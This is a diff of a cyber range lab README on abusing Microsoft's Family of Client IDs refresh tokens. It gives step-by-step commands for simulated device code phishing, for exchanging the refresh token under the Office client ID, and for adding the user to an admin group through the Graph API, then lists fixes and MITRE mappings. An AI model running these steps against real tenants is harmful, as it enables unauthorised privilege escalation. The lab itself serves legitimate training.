@@ -1,26 +1,96 @@
-# Vulnerable Application Information
+# Family of Client IDs (FOCI) Refresh Token Abuse
 
-In this scenario, the attacker must obtain a special refresh token called a family refresh token. This kind of token can be obtained by phishing a user using the device code phish technique. This technique abuses the OAuth 2.0 device authorization grant flow.
+**Provider:** Azure | **Category:** Identity / OAuth Token Abuse
 
-To enable this flow, the device prompts the user to visit a webpage on another device to sign in and enter a specific code. Once the user is successfully signed in, the device obtains the necessary access tokens and refresh tokens. The attacker misuses this flow by deceiving the victim into entering the specific code and login information, allowing the attacker to receive the tokens.
+## Scenario
 
-In this vulnerable application, we simulate the device code phishing as it is not the most interesting part of the attack. The cyber range user runs the following command:
+Microsoft's **Family of Client IDs (FOCI)** is an undocumented feature that allows a
+refresh token obtained for one Microsoft first-party application to be redeemed for an
+access token scoped to a **different** first-party application — without re-prompting the
+user for consent.
+
+This lab simulates device code phishing to obtain a family refresh token, then demonstrates
+how switching the `client_id` can unlock scopes not available to the original application
+(e.g., Graph API scopes that allow group membership modification).
+
+> **Note:** Device code phishing is simulated — instead of tricking a real victim, you
+> manually enter the device code with the victim's credentials provided by the lab. Tokens
+> are cached in `msal_token_cache.json`. Delete this file between runs if needed.
+
+## Attack Path
 
 ```
+[Attacker] runs:  az login --use-device-code --allow-no-subscriptions
+    |
+    v
+Victim enters code at microsoft.com/devicelogin (simulated)
+    |
+    v
+Family Refresh Token stored in msal_token_cache.json
+    |
+    v
+Exchange RT with new client_id (e.g. Microsoft Office: d3590ed6-...)
+    |
+    v
+New access token with Group.ReadWrite.All scope
+    |
+    v
+POST /v1.0/groups/<admin-group-id>/members/$ref
+```
+
+### Step 1 — Obtain the family refresh token
+
+```bash
 az login --use-device-code --allow-no-subscriptions
+# Visit microsoft.com/devicelogin and enter the provided victim credentials
 ```
 
-This grants the user a code that is used to log in to [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin). Instead of the attacker tricking the victim to enter the code that is provided by Microsoft, the attacker will himself enter this code with the credentials of the victim which will be outputted in the cyber range. The tokens will be available in `msal_token_cache.json`.
+The refresh token is now in `~/.azure/msal_token_cache.json`.
 
-The ultimate goal of this vulnerable application is to make the attacker add an account with low privileges that he has compromised to the group of global administrators by abusing the undocumented feature that gives the ability of refresh tokens to be redeemed for bearer tokens as any other client in the family.
+### Step 2 — Exchange for a token with a different client ID
 
-It is important to note that in this scenario, the attacker switches the client id, but in reality, it is not necessary. The attacker can already add users to groups using the permissions of the Azure CLI. Since the purpose of this cyber range is to reduce costs, we assume that users do not have licenses. Therefore, they do not have access to the entire 365 suite, such as emails, OneDrive, or SharePoint. The Azure CLI application allows adding a user to a group but does not permit reading emails. In such cases, switching the client id to Microsoft Office application (`d3590ed6-52b3-4102-aeff-aad2292ab01c`) can be useful. The goal of this vulnerable application is solely to demonstrate the possibility of switching the client id.
+Using [TokenTactics](https://github.com/rvrsh3ll/TokenTactics):
 
+```powershell
+Import-Module TokenTactics
+$tokens = Invoke-RefreshToMSGraphToken -domain <tenant-domain> -refreshToken <rt>
+$tokens.access_token
+```
 
-## ⚠️ Warning
+Or manually:
 
-**Important:** Details regarding the attack, safeguards, and methods for identifying this vulnerability, weakness, or misconfiguration are available in the PDF document.
+```bash
+curl -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
+  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c" \
+  -d "grant_type=refresh_token" \
+  -d "refresh_token=<rt>" \
+  -d "scope=https://graph.microsoft.com/.default"
+```
 
----
+### Step 3 — Add yourself to the admin group
 
+```bash
+curl -X POST "https://graph.microsoft.com/v1.0/groups/<group-id>/members/\$ref" \
+  -H "Authorization: Bearer <access_token>" \
+  -H "Content-Type: application/json" \
+  -d '{"@odata.id":"https://graph.microsoft.com/v1.0/directoryObjects/<your-user-id>"}'
+```
 
+## How to Fix in Production
+
+1. **Use Continuous Access Evaluation (CAE)** to revoke tokens immediately when a user's
+   risk level changes or their session is terminated.
+2. **Monitor for token redemptions across unusual client IDs** in the Entra ID sign-in
+   logs — filter on `clientAppUsed` for unexpected first-party application IDs.
+3. **Conditional Access**: Require re-authentication (MFA) for sensitive Graph API
+   operations regardless of token validity.
+4. **Disable the device code flow** via Conditional Access for users who don't need it.
+
+## MITRE ATT&CK Mapping
+
+| Technique | ID |
+|---|---|
+| Steal Application Access Token | [T1528](https://attack.mitre.org/techniques/T1528/) |
+| Phishing | [T1566](https://attack.mitre.org/techniques/T1566/) |
+| Use Alternate Authentication Material: Application Access Token | [T1550.001](https://attack.mitre.org/techniques/T1550/001/) |
+| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
